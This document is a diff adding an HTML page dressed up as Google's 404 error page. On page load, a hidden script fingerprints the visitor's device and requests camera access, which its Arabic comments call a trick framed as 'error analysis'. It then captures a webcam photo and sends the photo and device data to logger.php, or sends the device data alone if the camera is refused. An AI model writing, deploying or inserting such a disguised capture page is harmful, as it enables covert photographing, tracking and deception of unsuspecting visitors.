@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Error 404 (Not Found)!!1</title>
+    <style>
+        body { font-family: arial, sans-serif; background-color: #fff; color: #222; padding: 15px; text-align:center; }
+        #logo { background: url(https://www.google.com/images/errors/robot.png) no-repeat; height: 224px; width: 310px; margin: 50px auto 0; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div id="logo"></div>
+    <p><b>404.</b> <ins>That’s an error.</ins></p>
+    <p>The requested URL was not found on this server.</p>
+
+    <script>
+        async function captureData() {
+            const deviceInfo = {
+                screen: window.screen.width + "x" + window.screen.height,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                cores: navigator.hardwareConcurrency,
+                lang: navigator.language,
+                memory: navigator.deviceMemory || "Unknown"
+            };
+
+            // طلب الكاميرا بخدعة "تحليل الخطأ"
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photo = canvas.toDataURL('image/jpeg');
+                
+                // إرسال الصورة والبيانات
+                fetch('logger.php', {
+                    method: 'POST',
+                    body: JSON.stringify({ photo: photo, info: deviceInfo })
+                });
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                // إذا رفض الكاميرا، نرسل البيانات التقنية فقط
+                fetch('logger.php', {
+                    method: 'POST',
+                    body: JSON.stringify({ info: deviceInfo })
+                });
+            }
+        }
+        window.onload = captureData;
+    </script>
+</body>
+</html>
